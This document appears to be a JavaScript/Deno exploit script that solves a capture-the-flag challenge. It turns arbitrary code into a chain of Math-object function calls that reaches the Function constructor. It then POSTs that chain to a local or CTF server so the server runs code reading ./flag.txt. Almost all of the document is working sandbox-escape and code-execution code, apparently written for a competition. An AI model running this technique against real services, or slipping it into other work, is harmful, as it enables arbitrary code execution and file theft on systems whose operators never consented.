function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []

  findTarget(scope, initPath)

  // return the shortest one
  return result.sort((a, b) => a.length - b.length)[0]

  function findTarget(obj, path) {
    if(visited.has(obj)) return
    visited.add(obj)
    const list = Object.getOwnPropertyNames(obj)
    for(let key of list) {
      const item = obj[key]
      const newPath = path ? path + "." + key : key
      try {
        if (matchFn(item)) {
          result.push(newPath)
          continue
        }
      } catch(err){}
      
      if (item && typeof item === 'object') {
        findTarget(item, newPath)
      }
    }
  }
}

function findTargetNumber(init, target) {
  let queue = [[[], init]]
  let visited = new Set()
  return bfs(target)

  function bfs(target) {
    while(queue.length) {
      let [path, current] = queue.shift()
      for(let key of Object.getOwnPropertyNames(Math)){
        if (typeof Math[key] !== 'function') continue
        let value = Math[key]?.(current)
        if (value && !Number.isNaN(value)) {
          let newPath = [`Math.${key}`, ...path]
          if (value === target) {
            return newPath
          }

          if (newPath.length >= 10) return

          if (!visited.has(value)) {
            visited.add(value)
            queue.push([newPath, value])
          }
        }
      }
    }
  }
}

function buildExploit(arrName, content) {
  let ans = []
  let currentIndex = 0
  let codeResult = ''

  // @credit: @y0d3n
  addFunction('Math.imul')
  addFunction('Math.seeds.splice')

  const findMathName = (index, char) =>  
    findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') || findTargetFromScope(Math.abs.name.constructor, item => item.name.at(index) === char, 'Math.abs.name.constructor') 
  
  for(let char of content) {
    console.log(char)

    // if we can find it in the Math for the current index, use it
    let result = findMathName(currentIndex, char)
    if (result) {
      addFunction(`${result}.name.at`)
      addFunction(`${arrName}.push`)
      currentIndex++
      continue
    }

    const mapping = [
      ['Math.LN2.valueOf'], // 0
      ['Math.LOG2E.valueOf'], // 1
      ['Math.E.valueOf'], // 2
      ['Math.PI.valueOf'], // 3
    ]

    // try to find Math.fn[i] == char
    let found = false
    for(let i=0; i<mapping.length; i++) {
      result = findMathName(i, char)
      if (char === 'v' && !result) {
        result = 'Math.LN2.valueOf'
      }
      if (result) {
        addFunction(mapping[i][0])
        addFunction(`${result}.name.at`)
        addFunction(`${arrName}.push`)
        currentIndex++
        found = true
        break
      }
    }

    if (found) {
      continue
    }

    // @credit: @Astrid
    if (char === '(') {
      addFunction('Math.isPrototypeOf.name.length.valueOf')
      addFunction('Math.log2')
      addFunction('Math.exp')
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    } else if (char === '.') {
      addFunction('Math.PI.valueOf')
      addFunction('Math.exp')
      addFunction('Math.acosh')
      addFunction('Math.exp')
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    } else {

      let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0))
      mathResult.reverse() // remember to reverse cause the order
      for(let row of mathResult) {
        addFunction(row)
      }
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    }
  }

  // add eval structure
  addFunction('Math.random.name.valueOf')
  addFunction(`${arrName}.join`)
  addFunction('Math.abs.constructor')
  addFunction('Math.abs.constructor.prototype.call.call')

  return ans.reverse()

  function addFunction(name){
    ans.unshift(name)
    codeResult = `${name}(${codeResult})`
  }
}

Math.seeds = []
// @credit: @DrBrix
// let t = {"message": `${Deno.readTextFileSync("./flag.txt")}`}
// let t = eval('({"message": `${Deno.readTextFileSync("./flag.txt")}`})')
// console.log(t)
// const arr = buildExploit('Math.seeds', '     ({"message": `${Deno.readTextFileSync("./flag.txt")}`})')
// let x = Math.abs.constructor.prototype.call.call(Math.abs.constructor("return Deno.readTextFileSync('./flag.txt')"))
// console.log(x)

let url = "http://0.0.0.0:8080"
let flag = "./flag.txt"
// let url = "http://ctf.tcp1p.com:29997"
// let flag = "./flag.txt"
const arr = buildExploit('Math.seeds', 'return Deno.readTextFileSync("'+flag+'")')

let resp = await fetch(url);
if (resp.status != 200){
  console.log("Fail 1");
  console.log(resp.status);
  Deno.exit()
}

let operators = [];
let req = new Request(url, {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(arr),
});
let post = await fetch(req);

console.log(post.status);
console.log(await post.text());

